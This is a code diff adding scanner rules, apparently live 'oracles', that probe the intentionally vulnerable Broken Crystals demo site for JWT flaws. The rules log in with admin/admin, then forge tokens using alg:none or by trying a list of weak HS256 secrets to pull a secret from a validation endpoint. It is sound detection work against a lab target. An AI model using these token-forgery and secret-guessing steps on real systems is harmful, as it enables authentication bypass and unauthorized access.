@@ -113015,6 +113015,139 @@ const brokencrystalsJwtHmacConfusionRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+/** POST /api/auth/jwt/hmac/login + alg:none JWT on companion /validate — HMAC confusion login chain. */
+const brokencrystalsJwtHmacConfusionLoginLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const loginUrl = new URL("/api/auth/jwt/hmac/login", ctx.origin).toString();
+  const validateUrl = new URL("/api/auth/jwt/hmac/validate", ctx.origin).toString();
+  const loginBody = JSON.stringify({ user: "admin", password: "admin", op: "basic" });
+  const [badLogin, goodLogin] = await Promise.all([
+    ctx.probe.get(loginUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ user: "thugir-invalid", password: "invalid", op: "basic" })
+    }),
+    ctx.probe.get(loginUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { "Content-Type": "application/json" },
+      body: loginBody
+    })
+  ]);
+  if (brokencrystalsJwtLoginTokenOk(badLogin.body)) return NEGATIVE;
+  if (!brokencrystalsJwtLoginTokenOk(goodLogin.body)) return NEGATIVE;
+  const now = Math.floor(Date.now() / 1000);
+  const algNoneToken = buildAlgNoneJwt({ user: "admin", exp: now + 3600 });
+  const forgedAuth = await ctx.probe.get(validateUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${algNoneToken}` }
+  });
+  if (!looksAuthGatedJson(forgedAuth) || !brokencrystalsJwtValidateSecretOk(forgedAuth.body)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      loginUrl,
+      validateUrl,
+      loginStatus: goodLogin.status,
+      statusWithAlgNone: forgedAuth.status,
+      responseSample: forgedAuth.body.slice(0, 150).trim(),
+      note: "Broken Crystals POST /api/auth/jwt/hmac/login issues JWT; companion /validate accepts alg:none JWT and returns secret — HMAC confusion login oracle"
+    }
+  };
+};
+
+const brokencrystalsJwtHmacConfusionLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/jwt\/hmac\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsJwtHmacConfusionLoginLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/jwt/hmac/login route scan — login issues JWT and alg:none bypasses HMAC validation on companion /validate"
+    }
+  };
+};
+
+/** POST /api/auth/jwt/weak-key/login + weak-secret HS256 JWT on companion /validate — weak-key login chain. */
+const brokencrystalsJwtWeakKeyLoginLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const loginUrl = new URL("/api/auth/jwt/weak-key/login", ctx.origin).toString();
+  const validateUrl = new URL("/api/auth/jwt/weak-key/validate", ctx.origin).toString();
+  const loginBody = JSON.stringify({ user: "admin", password: "admin", op: "basic" });
+  const [badLogin, goodLogin] = await Promise.all([
+    ctx.probe.get(loginUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ user: "thugir-invalid", password: "invalid", op: "basic" })
+    }),
+    ctx.probe.get(loginUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { "Content-Type": "application/json" },
+      body: loginBody
+    })
+  ]);
+  if (brokencrystalsJwtLoginTokenOk(badLogin.body)) return NEGATIVE;
+  if (!brokencrystalsJwtLoginTokenOk(goodLogin.body)) return NEGATIVE;
+  const now = Math.floor(Date.now() / 1000);
+  const claims = { user: "admin", exp: now + 3600 };
+  for (const secret of BROKEN_CRYSTALS_JWT_WEAK_SECRETS) {
+    const token = buildHs256Jwt(claims, secret);
+    const forgedAuth = await ctx.probe.get(validateUrl, {
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { Authorization: `Bearer ${token}` }
+    });
+    if (!looksAuthGatedJson(forgedAuth) || !brokencrystalsJwtValidateSecretOk(forgedAuth.body)) continue;
+    return {
+      fired: true,
+      confidence: 0.94,
+      evidence: {
+        loginUrl,
+        validateUrl,
+        loginStatus: goodLogin.status,
+        weakSecret: secret,
+        statusWithWeakJwt: forgedAuth.status,
+        responseSample: forgedAuth.body.slice(0, 150).trim(),
+        note: `Broken Crystals POST /api/auth/jwt/weak-key/login issues JWT; companion /validate accepts HS256 JWT signed with weak secret '${secret}' — weak-key login oracle`
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+const brokencrystalsJwtWeakKeyLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/jwt\/weak-key\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsJwtWeakKeyLoginLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/jwt/weak-key/login route scan — login issues JWT and weak HMAC secret bypasses validation on companion /validate"
+    }
+  };
+};
+
 const brokencrystalsJwtJwkEmptyLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const path = "/api/auth/jwt/jwk/validate";
@@ -124587,6 +124720,10 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsSimpleCsrfRouteLiveOracle,
   brokencrystalsJwtHmacConfusionLiveOracle,
   brokencrystalsJwtHmacConfusionRouteLiveOracle,
+  brokencrystalsJwtHmacConfusionLoginLiveOracle,
+  brokencrystalsJwtHmacConfusionLoginRouteLiveOracle,
+  brokencrystalsJwtWeakKeyLoginLiveOracle,
+  brokencrystalsJwtWeakKeyLoginRouteLiveOracle,
   brokencrystalsJwtJwkEmptyLiveOracle,
   brokencrystalsJwtJwkEmptyRouteLiveOracle,
   brokencrystalsJwtX5cRogueLiveOracle,
